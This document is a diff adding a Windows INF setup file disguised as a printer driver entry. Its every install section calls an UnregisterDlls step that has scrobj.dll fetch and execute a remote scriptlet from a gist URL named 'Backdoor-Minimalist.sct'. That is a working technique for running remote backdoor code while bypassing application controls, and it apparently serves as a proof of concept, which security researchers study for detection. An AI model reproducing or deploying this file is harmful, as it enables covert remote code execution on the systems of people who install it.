@@ -1,0 +1,31 @@
+; ----------------------------------------------------------------------
+; Required Sections
+; ----------------------------------------------------------------------
+[Version] 
+Signature=$CHICAGO$
+Provider=cannji
+Class=Printer
+
+[Manufacturer]
+HuntressLabs=ModelsSection,NTx86,NTia64,NTamd64
+
+; ----------------------------------------------------------------------
+; Models Section
+; ----------------------------------------------------------------------
+[ModelsSection.NTx86]
+UnregisterDlls = tune
+
+[ModelsSection.NTia64]
+UnregisterDlls = tune
+
+[ModelsSection.NTamd64]
+UnregisterDlls = tune
+
+; ----------------------------------------------------------------------
+; Support Sections
+; ----------------------------------------------------------------------
+[DefaultInstall]
+UnregisterDlls = tune
+
+[tune]
+11,,scrobj.dll,2,60,https://gist.githubusercontent.com/Backdoor-Minimalist.sct
